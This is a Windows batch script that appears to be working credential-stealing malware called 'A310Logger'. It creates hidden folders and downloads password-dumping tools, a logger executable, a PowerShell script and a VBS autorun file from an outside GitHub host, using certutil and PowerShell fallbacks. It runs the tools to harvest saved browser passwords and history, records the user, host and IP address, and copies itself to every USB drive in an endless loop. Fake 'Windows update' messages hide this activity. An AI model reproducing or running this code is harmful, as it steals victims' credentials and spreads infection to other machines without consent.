@ECHO OFF
setlocal enableextensions
cd /D "%~dp0"


echo *************Create directory****************
   mkdir C:\Users\%username%\AppData\Roaming > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\0101 > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\0101 /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\A310Logger /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger\Browsers  > nul 2> nul
   mkdir C:\Users\%username%\AppData\Local\A310Logger\Others > nul 2> nul
   mkdir C:\Users\%username%\AppData\Local\A310Logger\Webcam > nul 2> nul
   
   echo Directory Created



echo *************Changing working dir****************
   cd /D C:\Users\%username%\AppData\Roaming\
   echo Success!
   echo.


:loop
echo *************Internet connection****************     
   echo Checking internet connectivity. Please wait...
   timeout 1 > NUL
   Ping www.google.nl -n 1 -w 1000 > NUL
   if errorlevel 1 (set internet=Not connected to internet) else (set internet=Connected to internet)
   echo %internet%!!
   echo.
   timeout 1 > NUL
   if "%internet%" == "Not connected to internet" ( 
      cls
      goto loop
   ) else (


echo *************DOWNLOAD file****************
   echo Downloading...
   timeout 3 > NUL
   
   if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (      
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2   

   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
      if errorlevel 1 goto ERROR2   
   goto SUCCESS 


   :ERROR2
   echo Your first attempt might fail! We'll try second.
   echo.
   echo Please, wait...
   timeout 3 > NUL
   if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3
     
   if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
      if errorlevel 1 goto ERROR3
   goto SUCCESS 


   :ERROR3
   echo Your second attempt might fail! We'll try third.
   echo.
   echo Please, wait...
   timeout 3 > NUL

   set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
   set filename="AutoRun.vbs"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true"
   set filename="facebook.bat"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true"
   set filename="instagram.ps1"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true"
   set filename="a310logger.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true"
   set filename="folder.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF
   goto SUCCESS 
  

   :EOF 
   echo Your last attempt might fail.
   echo Check internet conectivity!?
   timeout 5 
   cls
   goto loop
   pause


   :SUCCESS
   echo DOWNLOAD SUCCESSFUL!!
      echo *************Copy file****************
      copy "C:\Users\%username%\AppData\Roaming\*.*" "C:\Users\%username%\AppData\Local\0101\" /y > nul 2> nul
      echo Copied!
      echo.
      echo.
      echo.
      echo.
   echo *************Execute file****************
      for %%a in (*.exe) do (
         call %%a /stext C:\Users\%username%\AppData\Local\A310Logger\Others\%%a.txt
      )		
      echo User: %ComputerName% \ %UserName% >"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      echo Public_IP: >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      ipconfig | find /i "IPv4" >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"

      echo Executed
      echo.


   echo *************Windows updates found****************
      echo Checking Windows for Update. Please wait...
      echo.

   echo *************Run powershell file****************
      powershell.exe -ExecutionPolicy Bypass -File "%cd%\instagram.ps1"
	   

   echo *************Give feedback success****************
      echo Yes!!    



   )
   

	:pendrive
	echo *************Pendrive check****************
	timeout 1 > NUL
	echo Checking for pendrive...
	for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
	if %%l equ 2 (
	mkdir %%i\Appdata > nul 2> nul
	if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\folder.exe" /Y > nul 2> nul
	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\Appdata\folder.exe" /Y > nul 2> nul
	)
	if exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\folder.exe" /Y > nul 2> nul
	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\Appdata\folder.exe" /Y > nul 2> nul
	)
	mkdir "%%i\System Update" > nul 2> nul
	attrib +h "%%i\System Update" /s /d
	copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
	echo Copied!
	) 
	)
	echo.
	echo.
	cls
	goto pendrive
	
	

exit
